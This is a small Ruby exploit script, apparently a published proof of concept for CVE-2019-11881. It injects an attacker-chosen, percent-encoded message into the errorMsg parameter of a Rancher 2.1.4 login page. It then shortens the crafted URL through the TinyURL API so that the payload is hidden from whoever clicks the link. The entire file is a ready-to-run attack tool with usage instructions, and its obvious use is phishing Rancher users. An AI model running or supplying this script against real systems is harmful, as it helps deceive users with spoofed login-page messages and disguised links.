#!/usr/bin/ruby
require 'net/http'
require 'uri'
system("clear")
puts "VanCleef - Rancher 2.1.4 Web Parameter Tampering\nCVE-2019-11881 - Mauro Eldritch (@mauroeldritch)"
if ARGV.count == 3
    ip = ARGV[0]
    port = ARGV[1]
    payload = ARGV[2]
    chars = payload.split('')
    encoded_payload = []
    chars.each { |c| encoded_payload.push("%" + c.unpack('H*')[0]) }
    url = "https://#{ip}:#{port}/login?errorMsg=#{encoded_payload.join('')}"
    uri = URI.parse("http://tinyurl.com/api-create.php?url=#{url}")
    response = Net::HTTP.get_response(uri)
    puts "\nURL: #{url}"
    puts "\nTinyurl: #{response.body}"
else
    puts "[!] Usage: ./vancleef.rb rancher_ip rancher_port message_to_display (double-quoted)"
end
